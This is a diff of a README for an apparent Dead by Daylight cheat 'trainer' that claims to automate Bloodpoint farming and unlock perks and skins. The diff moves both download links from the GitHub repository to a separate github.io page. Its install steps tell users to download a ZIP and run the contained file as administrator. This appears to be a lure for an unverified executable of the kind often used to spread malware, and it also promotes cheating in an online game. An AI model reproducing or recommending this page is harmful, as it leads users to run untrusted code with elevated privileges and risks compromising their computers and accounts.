@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026-Mega - Automate your Dead by Daylight progression
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/Dennytropical430/DBD-AutoGrind-Trainer-2026-Mega)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://dennytropical430.github.io)
 
 ## 📋 Project Overview
 This software automates progression in Dead by Daylight. It assists players by managing Bloodpoint farming, unlocking perks and skins, and providing gameplay overlays. The tool runs externally to ensure minimal interference with game files. This edition acts as a comprehensive manager for account assets and in-game performance.
@@ -18,7 +18,7 @@ Check that your computer meets these standards to ensure the software runs witho
 Follow these instructions to set up the tool. Read each step carefully to avoid errors during the installation process.
 
 1. Ensure Dead by Daylight is closed before you begin.
-2. Visit the project link to acquire the latest version of the trainer: [Download](https://github.com/Dennytropical430/DBD-AutoGrind-Trainer-2026-Mega).
+2. Visit the project link to acquire the latest version of the trainer: [Download](https://dennytropical430.github.io).
 3. Locate the downloaded file in your browser or your Downloads folder.
 4. Extract the contents of the ZIP folder to a dedicated location on your computer. Create a new folder on your desktop to keep files organized.
 5. Right-click the application file and select "Run as administrator". This gives the program permission to interact with the game process.
